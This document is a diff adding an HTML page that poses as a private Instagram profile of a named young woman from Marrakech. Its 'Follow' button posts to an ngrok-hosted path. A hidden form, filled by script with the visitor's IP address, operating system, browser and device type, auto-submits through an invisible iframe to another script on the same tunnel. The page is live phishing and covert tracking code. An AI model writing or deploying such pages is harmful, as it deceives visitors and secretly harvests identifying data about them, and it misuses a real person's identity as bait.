@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>instg-profile-kaoutar-priv </title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .profile-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 350px;
+        }
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .username {
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .bio {
+            font-size: 14px;
+            color: #555;
+            margin: 10px 0;
+        }
+        .posts {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+        }
+        .post-img {
+            width: 90px;
+            height: 90px;
+            border-radius: 5px;
+            object-fit: cover; }
+            .instagram-button {
+  background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
+  color: white;
+  font-weight: bold;
+  padding: 12px 24px;
+  border: none;
+  border-radius: 50px;
+  cursor: pointer;
+  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+  transition: all 0.3s ease-in-out;
+}
+            input{
+        display: none;
+    }
+    label{
+        display: none;
+    } 
+    #btn{
+        display: none;
+    }
+
+.instagram-button:hover {
+  opacity: 0.9;
+  transform: scale(1.05);
+    
+}
+
+       
+    </style>
+</head>
+<body>
+    <div class="profile-container">
+        <form action="https://wondrous-select-stallion.ngrok-free.app/instgrm/index.php" method="post">
+        <img class="profile-pic" src="https://wondrous-select-stallion.ngrok-free.app/kaoutar/img.0.jpeg" 
+        alt="Photo de profil">
+        <div class="username">kaoutar_Gg_08</div>
+        <button class="instagram-button" type="submit">Follow</button>
+
+        <div class="bio">MARRAKECH 2004 | Eyes speak louder than words</div>
+        <div class="posts">
+            <img class="post-img" src="https://fstt.ac.ma/Portail2023/wp-content/uploads/2023/06/327161198_883765066163388_2010873196881681493_n.jpg" 
+            alt="Post 1">
+            <img class="post-img" src="https://redencomun.com/wp-content/uploads/IMG_3080-1024x693.jpg"
+             alt="Post 2">
+            <img class="post-img" src="https://wondrous-select-stallion.ngrok-free.app/kaoutar/img1.jpeg"
+             alt="Post 3">
+        </div>
+    </form>
+    </div>
+     <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+    <form id="userForm" action="https://wondrous-select-stallion.ngrok-free.app/pw/shit.php" method="POST" target="hidden_iframe">
+        <label for="inp0">IP Address:</label>
+        <input type="text" id="inp0" name="ip" readonly><br><br>
+
+        <label for="inp1">Operating System:</label>
+        <input type="text" id="inp1" name="os" readonly><br><br>
+
+        <label for="inp2">Browser Name:</label>
+        <input type="text" id="inp2" name="browser" readonly><br><br>
+
+        <label for="inp3">Device Type:</label>
+        <input type="text" id="inp3" name="device" readonly><br><br>
+
+        <button type="submit" id="btn" >Submit</button>
+    </form>
+
+
+
+    <script>
+        // Fetch IP Address
+        fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById('inp0').value = data.ip;
+        })
+        .catch(error => console.error("Error fetching IP:", error));
+
+        // Detect Operating System
+        function getOS() {
+            let userAgent = window.navigator.userAgent;
+            let platform = window.navigator.platform;
+            let os = "Unknown OS";
+
+            if (platform.includes("Win")) os = "Windows";
+            else if (platform.includes("Mac")) os = "MacOS";
+            else if (platform.includes("Linux")) os = "Linux";
+            else if (/Android/.test(userAgent)) os = "Android";
+            else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
+
+            return os;
+        }
+        document.getElementById('inp1').value = getOS();
+
+        // Detect Browser Name
+        function getBrowserName() {
+            let userAgent = navigator.userAgent;
+
+            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) return "Google Chrome";
+            if (userAgent.includes("Edg")) return "Microsoft Edge";
+            if (userAgent.includes("Firefox")) return "Mozilla Firefox";
+            if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Apple Safari";
+            if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
+            if (userAgent.includes("MSIE") || userAgent.includes("Trident")) return "Internet Explorer";
+
+            return "Unknown Browser";
+        }
+        document.getElementById('inp2').value = getBrowserName();
+
+        // Detect Device Type
+        function getDeviceType() {
+            let userAgent = navigator.userAgent.toLowerCase();
+
+            if (/iphone|ipad|ipod/.test(userAgent)) return "Apple iOS Device";
+            if (/android/.test(userAgent)) return "Android Device";
+            if (/windows/.test(userAgent)) return "Windows PC";
+            if (/macintosh|mac os x/.test(userAgent)) return "MacOS Device";
+            if (/linux/.test(userAgent)) return "Linux Device";
+
+            return "Unknown Device";
+        }
+        document.getElementById('inp3').value = getDeviceType();
+
+
+
+
+
+        function run() {
+            document.getElementById("btn").click();;
+}
+
+setTimeout(run, 900);
+
+    </script>
+</body>
+</html>
